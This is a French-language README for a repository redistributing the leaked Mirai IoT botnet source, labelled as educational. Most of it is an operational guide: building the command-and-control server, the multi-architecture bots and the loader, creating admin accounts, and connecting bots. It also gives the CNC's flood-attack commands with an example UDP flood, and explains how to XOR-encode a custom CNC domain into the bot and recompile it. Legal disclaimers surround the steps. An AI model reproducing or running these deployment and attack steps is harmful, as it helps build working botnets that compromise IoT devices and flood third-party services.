# 🔬 Code Source du Botnet Mirai - Recherche Éducative Uniquement

[![Usage Éducatif](https://img.shields.io/badge/Usage-Éducatif%20Uniquement-red)](https://github.com/Linkatplug/Mirai-Source-Code)
[![Recherche Sécurité](https://img.shields.io/badge/Usage-Recherche%20Sécurité-yellow)](https://github.com/Linkatplug/Mirai-Source-Code)
[![License](https://img.shields.io/badge/License-GPL-blue)](LICENSE.md)

**Code Source Historique du Botnet IoT pour la Recherche en Sécurité et l'Éducation en Environnement Isolé**

---

## ⚠️ AVERTISSEMENT LÉGAL CRITIQUE

**CE LOGICIEL EST DESTINÉ UNIQUEMENT À DES FINS ÉDUCATIVES ET DE RECHERCHE EN SÉCURITÉ**

🚨 **LISEZ ATTENTIVEMENT AVANT DE CONTINUER** 🚨

- ✅ **UTILISATION LÉGALE**: Recherche en sécurité, formation en tests d'intrusion, analyse de malwares et éducation en défense réseau dans des environnements de laboratoire **COMPLÈTEMENT ISOLÉS** avec des appareils **QUE VOUS POSSÉDEZ**
- ❌ **UTILISATION ILLÉGALE**: Exploitation de botnets, attaque de systèmes sans autorisation, accès non autorisé à des ordinateurs, perturbation de services, ou toute activité malveillante
- ⚖️ **CONSÉQUENCES LÉGALES**: L'utilisation non autorisée peut entraîner des poursuites pénales, l'emprisonnement et des amendes importantes en vertu des lois sur la fraude informatique et les cybercrimes
- 🔒 **VOTRE RESPONSABILITÉ**: En utilisant ce code, vous acceptez l'entière responsabilité légale de vos actions

**SI VOUS NE COMPRENEZ PAS CES AVERTISSEMENTS, N'ALLEZ PAS PLUS LOIN**

---

## 📖 Table des Matières

- [Qu'est-ce que Mirai?](#quest-ce-que-mirai)
- [Prérequis](#prérequis)
- [Installation](#installation)
  - [Démarrage Rapide avec Docker (Recommandé)](#démarrage-rapide-avec-docker-recommandé)
  - [Installation Manuelle](#installation-manuelle)
- [Utilisation](#utilisation)
  - [Lancer le Serveur CNC](#lancer-le-serveur-cnc)
  - [Connecter des Bots](#connecter-des-bots)
  - [Tester les Attaques](#tester-les-attaques)
- [Architecture](#architecture)
- [Configuration](#configuration)
- [Dépannage](#dépannage)
- [Ressources d'Apprentissage](#ressources-dapprentissage)
- [Contribution](#contribution)
- [Crédits](#crédits)

---

## 🎯 Qu'est-ce que Mirai?

Mirai est un **botnet IoT historiquement significatif** qui a émergé en 2016 et causé des attaques DDoS (Déni de Service Distribué) massives, notamment:

- **Krebs on Security** - Attaque DDoS record de 620 Gbps
- **Dyn DNS** - A fait tomber des sites majeurs (Twitter, Reddit, Netflix, etc.)
- **OVH** - Attaque de 1.1 Tbps, l'une des plus importantes de l'époque

Le code source a été divulgué publiquement par "Anna-senpai" en septembre 2016 et est devenu une référence pour:

- 🔍 **Recherche en Sécurité IoT** - Comprendre les vulnérabilités IoT
- 🎓 **Éducation en Cybersécurité** - Enseigner l'architecture des botnets
- 🛡️ **Développement de Défenses** - Construire des systèmes de détection et d'atténuation
- 📊 **Analyse de Malwares** - Étudier les techniques de propagation et d'attaque

### Caractéristiques Principales

- **Support Multi-Architecture**: Compile pour ARM, MIPS, x86, PowerPC, SPARC, et plus
- **Brute-Force Telnet**: Scanne et compromet les appareils IoT avec des identifiants par défaut
- **Capacités DDoS**: Multiples vecteurs d'attaque (UDP flood, TCP SYN, HTTP flood, GRE, etc.)
- **Auto-Propagation**: Se propage automatiquement vers les appareils vulnérables
- **Infrastructure C&C**: Serveur de Commande et Contrôle pour gérer les bots

---

## 📋 Prérequis

### Configuration Système Requise

- **Système d'exploitation**: Linux (Ubuntu 20.04+ ou Debian 10+ recommandé)
- **Mémoire**: Minimum 2 Go RAM
- **Espace disque**: Au moins 1 Go libre
- **Réseau**: Environnement réseau isolé (machines virtuelles, VLANs, ou air-gapped)

### Logiciels Requis

```bash
# Dépendances principales
- gcc (7.0+)
- golang (1.11+)
- electric-fence
- mysql-server (5.7+ ou MariaDB 10.3+)
- mysql-client
- git
- make
- build-essential

# Optionnel pour Docker
- docker (20.10+)
- docker-compose (1.29+)
```

---

## 🚀 Installation

### Démarrage Rapide avec Docker (Recommandé)

Docker fournit une isolation complète et est le moyen **le plus sûr et le plus simple** pour tester Mirai.

#### 1. Installer Docker

```bash
# Ubuntu/Debian
sudo apt-get update
sudo apt-get install -y docker.io docker-compose

# Démarrer Docker
sudo systemctl start docker
sudo systemctl enable docker

# Ajouter votre utilisateur au groupe docker (déconnexion/reconnexion après)
sudo usermod -aG docker $USER
```

#### 2. Cloner le Dépôt

```bash
git clone https://github.com/Linkatplug/Mirai-Source-Code.git
cd Mirai-Source-Code
```

#### 3. Démarrer Tous les Services

```bash
# Construire et démarrer tous les conteneurs
docker-compose up -d --build

# Vérifier le statut
docker-compose ps

# Voir les logs
docker-compose logs -f cnc
```

#### 4. Se Connecter au CNC

```bash
telnet localhost 23

# Identifiants par défaut:
# Nom d'utilisateur: admin
# Mot de passe: password123
```

#### 5. Nettoyage

```bash
# Arrêter tous les services
docker-compose down

# Supprimer toutes les données (nettoyage complet)
docker-compose down -v
```

**✅ Pour des instructions Docker détaillées, voir [DOCKER.md](DOCKER.md)**

---

### Installation Manuelle

Pour une compréhension approfondie du système, vous pouvez installer et exécuter les composants manuellement.

#### 1. Installer les Dépendances

```bash
# Mettre à jour le système
sudo apt-get update

# Installer les paquets requis
sudo apt-get install -y \
    gcc \
    golang-go \
    electric-fence \
    mysql-server \
    mysql-client \
    git \
    build-essential \
    net-tools

# Vérifier les installations
gcc --version        # Devrait être 7.x ou supérieur
go version           # Devrait être 1.11 ou supérieur
mysql --version      # Devrait être 5.7 ou supérieur
```

#### 2. Cloner le Dépôt

```bash
git clone https://github.com/Linkatplug/Mirai-Source-Code.git
cd Mirai-Source-Code
```

#### 3. Configurer la Base de Données MySQL

```bash
# Démarrer le service MySQL
sudo systemctl start mysql
sudo systemctl enable mysql

# Créer la base de données et les tables
sudo mysql < scripts/db.sql

# Créer un utilisateur admin
sudo mysql mirai << EOF
INSERT INTO users VALUES (NULL, 'admin', 'password123', 0, 0, 0, 0, -1, 1, 30, '');
INSERT INTO users VALUES (NULL, 'testuser', 'test123', 0, 0, 0, 0, -1, 1, 30, '');
EOF

# Vérifier la configuration de la base de données
sudo mysql mirai -e "SELECT username FROM users;"
```

#### 4. Configurer le Serveur CNC

Éditer les identifiants de la base de données dans `mirai/cnc/main.go`:

```bash
nano mirai/cnc/main.go
```

Mettre à jour ces constantes:

```go
const DatabaseAddr string   = "127.0.0.1"
const DatabaseUser string   = "root"
const DatabasePass string   = ""           // Votre mot de passe root MySQL
const DatabaseTable string  = "mirai"
```

#### 5. Compiler les Composants

```bash
cd mirai

# Compiler en mode debug (recommandé pour l'apprentissage)
./build.sh debug telnet

# Cela crée dans le dossier debug/:
# - cnc (Serveur de Commande et Contrôle)
# - mirai.dbg (Bot pour x86 avec sortie de débogage)
# - mirai.* (Bots cross-compilés pour diverses architectures)
# - enc (Outil d'encodage de configuration)
# - scanListen (Écouteur de résultats de scan)
```

#### 6. Compiler le Loader (Optionnel)

```bash
cd ../loader
./build.sh

# Cela crée:
# - loader (Chargeur binaire pour appareils compromis)
```

**✅ Pour un guide d'installation étape par étape, voir [QUICKSTART.md](QUICKSTART.md)**

---

## 💻 Utilisation

### Lancer le Serveur CNC

Le serveur de Commande et Contrôle (CNC) gère tous les bots connectés et coordonne les attaques.

```bash
cd mirai/debug

# Lancer le serveur CNC (nécessite que MySQL soit en cours d'exécution)
./cnc

# Vous devriez voir:
# Mysql DB opened
# Listening on port :23 (CNC)
# Listening on port :101 (API)
```

### Se Connecter au CNC

Ouvrir un nouveau terminal et se connecter via telnet:

```bash
telnet localhost 23

# Se connecter avec les identifiants par défaut:
# Nom d'utilisateur: admin
# Mot de passe: password123
```

### Commandes CNC

Une fois connecté, vous pouvez utiliser ces commandes:

```
?                    - Afficher l'aide
bots                 - Lister les bots connectés
botcount             - Afficher le nombre de bots connectés
clear                - Effacer l'écran

# Commandes d'attaque (utiliser uniquement sur vos propres systèmes!)
udp [ip] [durée] [taille] [port]              - UDP flood
tcp [ip] [durée] [taille] [port] [flags]      - TCP flood
http [url] [durée]                             - HTTP flood
vse [ip] [durée]                               - Valve Source Engine flood
dns [ip] [durée]                               - DNS flood
greip [ip] [durée]                             - GRE IP flood
greeth [ip] [durée]                            - GRE Ethernet flood
```

### Connecter des Bots

Pour tester la connectivité des bots:

```bash
cd mirai/debug

# Lancer un bot (il essaiera de se connecter au CNC)
./mirai.dbg

# Dans votre session telnet CNC, taper:
bots

# Vous devriez voir votre bot listé!
```

### Tester les Attaques (En Toute Sécurité)

**⚠️ TESTER UNIQUEMENT CONTRE VOS PROPRES SYSTÈMES DANS UN RÉSEAU ISOLÉ**

```bash
# Dans la session telnet CNC:

# Exemple: UDP flood sur votre serveur de test pendant 30 secondes
udp 192.168.1.100 30 512 80

# Surveiller l'attaque depuis un autre terminal
sudo tcpdump -i any host 192.168.1.100
```

### Encodage de Configuration

Le bot utilise des chaînes de configuration encodées en XOR. Pour encoder des valeurs personnalisées:

```bash
cd mirai/debug

# Encoder un nom de domaine
./enc string "mon-serveur-cnc.com"

# La sortie sera quelque chose comme:
# XOR'ing 18 bytes of data...
# \x44\x57\x41\x41\x4A\x41\x44\x43...

# Copier ceci dans bot/table.c dans l'entrée TABLE_CNC_DOMAIN
```

---

## 🏗️ Architecture

### Vue d'Ensemble des Composants

```
┌─────────────────────────────────────────────────────────┐
│                Architecture Botnet Mirai                 │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  ┌──────────────┐         ┌─────────────────┐          │
│  │ Bot Infecté  │────────▶│  Serveur CNC    │          │
│  │(Appareil IoT)│◀────────│  (Commande &    │          │
│  └──────┬───────┘         │   Contrôle)     │          │
│         │                 └────────┬────────┘          │
│         │                          │                    │
│         │ Signale               ┌──▼──────┐            │
│         │ Appareils             │  MySQL  │            │
│         │ Vulnérables           │Database │            │
│         │                       └─────────┘            │
│         │                                               │
│         ▼                                               │
│  ┌──────────────┐         ┌─────────────────┐         │
│  │   Scanner    │────────▶│     Loader      │         │
│  │  (Port 48101)│         │ (Infecte Nouveaux│        │
│  └──────────────┘         │  Appareils)     │         │
│                           └─────────────────┘         │
└─────────────────────────────────────────────────────────┘
```

### Structure des Fichiers

```
Mirai-Source-Code/
│
├── mirai/                  # Code principal du botnet
│   ├── bot/                # Malware bot (C)
│   │   ├── main.c          # Point d'entrée
│   │   ├── attack*.c       # Implémentations des attaques DDoS
│   │   ├── scanner.c       # Scanner brute-force Telnet/SSH
│   │   ├── killer.c        # Tue les malwares concurrents
│   │   ├── table.c/h       # Configuration obfusquée
│   │   └── resolv.c        # Résolveur DNS
│   │
│   ├── cnc/                # Commande & Contrôle (Go)
│   │   ├── main.go         # Serveur CNC
│   │   ├── admin.go        # Interface admin
│   │   ├── attack.go       # Coordination des attaques
│   │   ├── database.go     # Interaction MySQL
│   │   └── bot.go          # Gestion des bots
│   │
│   └── tools/              # Outils utilitaires
│       └── scanListen.go   # Écouteur de résultats de scan
│
├── loader/                 # Loader pour propagation (C)
│   └── src/
│       ├── main.c          # Point d'entrée du loader
│       ├── server.c        # Serveur HTTP pour binaires
│       ├── binary.c        # Gestion des binaires
│       └── telnet_info.c   # Gestion des identifiants Telnet
│
├── scripts/                # Scripts de configuration
│   ├── db.sql              # Schéma de base de données MySQL
│   └── cross-compile.sh    # Assistant de cross-compilation
│
├── QUICKSTART.md           # Guide de démarrage rapide
├── DOCKER.md               # Guide de configuration Docker
├── ANALYSIS.md             # Analyse technique
└── README-FR.md            # Ce fichier
```

---

## ⚙️ Configuration

### Configuration du Bot (mirai/bot/table.c)

Le bot stocke la configuration dans des chaînes obfusquées par XOR:

```c
// Entrées de configuration clés:
TABLE_CNC_DOMAIN     // Domaine/IP du serveur CNC
TABLE_CNC_PORT       // Port du serveur CNC (défaut: 23)
TABLE_SCAN_CB_DOMAIN // Domaine de callback scan
TABLE_SCAN_CB_PORT   // Port de callback scan (défaut: 48101)
```

Pour changer la configuration:

1. Utiliser l'outil `enc` pour encoder de nouvelles valeurs
2. Mettre à jour les valeurs dans `bot/table.c`
3. Recompiler le bot

### Configuration du CNC (mirai/cnc/main.go)

```go
// Paramètres de base de données
const DatabaseAddr string   = "127.0.0.1"    // IP du serveur MySQL
const DatabaseUser string   = "root"          // Nom d'utilisateur MySQL
const DatabasePass string   = ""              // Mot de passe MySQL
const DatabaseTable string  = "mirai"         // Nom de la base de données

// Paramètres du serveur
const Tel_Port string       = "23"            // Port Telnet
const Api_Port string       = "101"           // Port API
```

---

## 🔧 Dépannage

### Le Serveur CNC Ne Démarre Pas

```bash
# Vérifier si MySQL est en cours d'exécution
sudo systemctl status mysql

# Vérifier si le port 23 est disponible
sudo netstat -tulpn | grep :23

# Si le port est utilisé, tuer le processus ou changer le port
sudo lsof -ti:23 | xargs kill -9

# Vérifier la connexion MySQL
mysql -u root -p -e "SHOW DATABASES;"

# Voir les logs du CNC
./debug/cnc
```

### Le Bot Ne Peut Pas Se Connecter au CNC

```bash
# Vérifier la configuration du domaine CNC
grep TABLE_CNC_DOMAIN mirai/bot/table.c

# Tester la résolution DNS
ping -c 1 cnc.changeme.com

# Tester la connexion telnet manuellement
telnet localhost 23

# Vérifier que le bot utilise la bonne IP/domaine
# Considérer l'utilisation de 127.0.0.1 ou localhost pour les tests
```

### Erreurs de Compilation

```bash
# Installer les dépendances manquantes
sudo apt-get install gcc golang electric-fence build-essential

# Vérifier l'environnement Go
go env

# Pour les erreurs de cross-compilation (attendues si les cross-compilateurs ne sont pas installés)
# Vous pouvez ignorer en toute sécurité les erreurs pour les architectures dont vous n'avez pas besoin

# Compiler uniquement pour x86 (mode debug)
cd mirai
gcc -std=c99 -DDEBUG -DMIRAI_TELNET bot/*.c -static -o debug/mirai.dbg
```

### Connexion MySQL Refusée

```bash
# Démarrer le service MySQL
sudo systemctl start mysql

# Réinitialiser le mot de passe root MySQL si nécessaire
sudo mysql
ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'votre_mot_de_passe';
FLUSH PRIVILEGES;
EXIT;

# Vérifier que la base de données existe
sudo mysql -e "SHOW DATABASES;"

# Recréer la base de données
sudo mysql < scripts/db.sql
```

---

## 📚 Ressources d'Apprentissage

### Documentation dans ce Dépôt

- **[QUICKSTART.md](QUICKSTART.md)** - Guide de démarrage rapide en 30 minutes
- **[DOCKER.md](DOCKER.md)** - Instructions complètes de configuration Docker
- **[ANALYSIS.md](ANALYSIS.md)** - Analyse technique approfondie du code
- **[ForumPost.md](ForumPost.md)** - Post original de la fuite avec détails techniques

### Ressources Externes

**Comprendre Mirai:**
- [Krebs on Security: KrebsOnSecurity Hit with Record DDoS](https://krebsonsecurity.com/2016/09/krebsonsecurity-hit-with-record-ddos/)
- [Wikipedia: 2016 Dyn Cyberattack](https://en.wikipedia.org/wiki/2016_Dyn_cyberattack)
- [MalwareMustDie Analysis](http://blog.malwaremustdie.org/2016/08/mmd-0056-2016-linuxmirai-just.html)

**Sécurité IoT:**
- Projet OWASP IoT Security
- Directives NIST sur la cybersécurité IoT
- Ressources IoT Security Foundation

**Outils de Défense:**
- Fail2ban - Protection contre le brute-force
- Suricata/Snort - Détection d'intrusions
- iptables/nftables - Règles de pare-feu
- Wireshark - Analyse du trafic réseau

---

## 🤝 Contribution

Les contributions sont les bienvenues pour améliorer les aspects **éducatifs** de ce dépôt:

✅ **Contributions Bienvenues:**
- Améliorations de la documentation
- Corrections de bugs dans les scripts de compilation
- Meilleures explications et tutoriels
- Exemples de défense/détection
- Exercices pédagogiques

❌ **NON Bienvenues:**
- Techniques d'évasion
- Capacités d'attaque améliorées
- Améliorations d'obfuscation
- Fonctionnalités anti-détection

Veuillez d'abord ouvrir une issue pour discuter des changements importants.

---

## 🙏 Crédits

- **Anna-senpai** - Auteur original qui a divulgué le code source ([post original](https://hackforums.net/showthread.php?tid=5420472))
- **Communauté de Recherche en Sécurité** - Pour l'analyse et la documentation
- **Chercheurs en Sécurité IoT** - Pour les améliorations de défense

---

## 📜 Licence

Voir [LICENSE.md](LICENSE.md) pour plus de détails.

**Ce code est fourni "tel quel" à des fins éducatives et de recherche uniquement. Les auteurs et contributeurs ne sont pas responsables de toute utilisation abusive ou dommage causé par ce logiciel.**

---

## ⚖️ Avertissement Final

**UTILISATION À VOS PROPRES RISQUES - FINS ÉDUCATIVES UNIQUEMENT**

En téléchargeant, installant ou utilisant ce logiciel, vous acceptez de:

1. L'utiliser **UNIQUEMENT** pour la recherche en sécurité légale et l'éducation
2. L'exploiter **UNIQUEMENT** dans des environnements complètement isolés
3. Tester **UNIQUEMENT** sur des systèmes que vous possédez ou pour lesquels vous avez une autorisation écrite explicite
4. **JAMAIS** l'utiliser pour attaquer, perturber ou endommager des systèmes
5. Accepter **L'ENTIÈRE RESPONSABILITÉ LÉGALE** de vos actions

**Les violations des lois sur la cybercriminalité peuvent entraîner:**
- Des accusations criminelles fédérales
- Des années d'emprisonnement
- Des amendes importantes
- Un casier judiciaire permanent
- Perte de certifications professionnelles et de carrière

**Si vous ne comprenez pas pleinement ces avertissements et les implications légales, N'UTILISEZ PAS CE LOGICIEL.**

---

<div align="center">

**🔒 Pour l'Éducation. Pour la Recherche. Pour la Défense. 🔒**

*"La meilleure défense est de comprendre l'attaque"*

**Restez Légal. Restez Éthique. Restez en Sécurité.**

</div>
